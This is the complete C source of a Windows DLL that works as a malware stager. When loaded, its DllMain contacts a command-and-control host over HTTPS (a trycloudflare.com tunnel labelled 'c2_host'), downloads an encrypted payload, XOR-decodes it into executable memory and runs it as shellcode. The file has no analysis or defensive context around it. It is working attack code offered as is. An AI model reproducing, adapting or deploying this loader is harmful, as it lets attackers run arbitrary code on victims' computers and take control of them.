#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

const char* c2_host = "expenses-feels-alfred-strengthening.trycloudflare.com";
int c2_port = 443;
const unsigned char xor_key = 106;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetConnectA(hInternet, c2_host, c2_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/generated/payload.enc", NULL, NULL, NULL, 
                                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
                if (hRequest) {
                    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                        unsigned char buffer[524288];
                        DWORD bytesRead;
                        if (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                            unsigned char* decoded = VirtualAlloc(NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                            if (decoded) {
                                for(DWORD i = 0; i < bytesRead; i++) decoded[i] = buffer[i] ^ xor_key;
                                void (*shellcode)() = (void(*)())decoded;
                                shellcode();
                            }
                        }
                    }
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
    }
    return TRUE;
}
